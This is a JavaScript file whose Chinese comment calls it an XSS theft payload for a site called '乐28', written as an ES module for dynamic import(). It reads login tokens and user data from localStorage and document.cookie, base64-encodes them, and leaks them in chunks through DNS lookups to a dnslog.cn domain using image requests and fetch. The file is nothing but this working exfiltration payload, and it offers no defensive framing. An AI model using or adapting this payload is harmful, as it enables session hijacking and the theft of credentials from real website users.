// 乐28 XSS 偷取 payload（兼容 import() 动态加载的 module 版本）
(function(){
  var DNS = 'pkaa6g.dnslog.cn';
  function g(k){ try{ return localStorage.getItem(k)||''; }catch(e){ return ''; } }
  var token = g('jnd28:token') || g('token') || '';
  var user  = g('jnd28:user')  || g('user')  || '';
  var ck    = document.cookie || '';
  var host  = location.host;
  function b64(s){ try{ return btoa(unescape(encodeURIComponent(s))); }catch(e){ return 'err'; } }
  var payload = 'T=' + token + '|U=' + user + '|C=' + ck + '|H=' + host;
  var encoded = b64(payload);
  var safe = encoded.replace(/[^A-Za-z0-9]/g, '');
  var i = 0, step = 40;
  function sendNext(){
    if (i >= safe.length) return;
    var chunk = safe.slice(i, i + step);
    i += step;
    var img = new Image();
    img.src = '//' + chunk + '.s' + (i/step - 1) + '.' + DNS;
    img.onload = sendNext;
    img.onerror = sendNext;
    try{ fetch('//' + chunk + '.s' + (i/step - 1) + '.' + DNS); }catch(e){}
  }
  sendNext();
  try{ new Image().src = '//jsok.' + DNS; }catch(e){}
})();
export {};
